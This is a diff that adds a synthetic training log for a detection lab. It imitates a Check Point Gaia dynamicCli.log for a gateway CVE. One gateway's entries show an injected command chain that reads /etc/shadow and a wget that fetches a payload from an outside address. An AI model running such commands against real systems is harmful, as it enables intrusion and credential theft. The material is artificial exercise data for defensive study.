@@ -1,0 +1,16 @@
+# SYNTHETIC training log — Check Point Gaia /var/log/dynamicCli.log (CVE-2026-123039 lab).
+# ALL DATA SYNTHETIC: generated for this lab, no real gateway data, no working
+# exploit strings beyond the vendor-published grep keywords. Hostnames are
+# fictional; addresses are documentation ranges (RFC 5737) only.
+# Format: ISO-8601 UTC timestamp, gateway, dynamicCli[pid]: message. Lines
+# marked [clish-wrapper] came through the legitimate Clish wrapper.
+# Contains: one full chain (gw-01), one lone non-wrapper Received line (gw-04),
+# one post-fix blocked attempt (gw-03), and clean wrapper traffic (gw-02).
+2026-11-03T09:00:00Z gw-02 dynamicCli[101]: [clish-wrapper] Received = show version
+2026-11-03T09:01:00Z gw-02 dynamicCli[101]: [clish-wrapper] Received = show interfaces
+2026-11-03T10:15:22Z gw-01 dynamicCli[204]: Received = id; cat /etc/shadow
+2026-11-03T10:15:23Z gw-01 dynamicCli[204]: Received = #return_value#
+2026-11-03T10:16:00Z gw-01 dynamicCli[205]: command received on socket: wget http://203.0.113.50/x
+2026-11-04T08:00:00Z gw-03 dynamicCli[300]: Rejected connection from unauthorized uid 1000
+2026-11-03T09:02:00Z gw-02 dynamicCli[101]: [clish-wrapper] Received = show route
+2026-11-03T11:00:00Z gw-04 dynamicCli[400]: Received = show arp
